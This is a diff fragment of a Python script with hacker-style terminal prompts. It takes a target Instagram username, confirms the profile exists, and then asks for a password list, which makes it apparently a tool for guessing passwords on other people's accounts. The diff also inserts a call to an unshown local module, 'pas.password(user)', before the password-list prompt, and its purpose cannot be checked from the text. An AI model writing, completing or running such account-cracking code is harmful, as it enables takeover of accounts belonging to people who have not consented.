@@ -53,12 +53,16 @@ user = input('''\n\033[31m[?] \033[36menter target username <Instagram>
 
 \033[20;37m┌─\033[93m[\033[31mroot\033[20;37m@\033[92minsta\033[93m]\033[20;37m─\033[93m[\033[92m~\033[93m]
 \033[20;37m└──╼ \033[95m❯❯❯ \033[0;37m''')
+
 req = requests.get(f'https://www.Instagram.com/{user}')
 if req.status_code == 200:
     print (f'\n\033[20;36m[*] user found => @{user}\n')
 else:
     print (f'\n\033[31m[!] \033[35mpage not found => @{user}\n')
     exit (1)
+time.sleep(0.8)
+from insta import pas
+pas.password(user)
 time.sleep(1)
 pas = input('''\n\n\033[31m[?] \033[36menter your \033[35m<password-list>
 
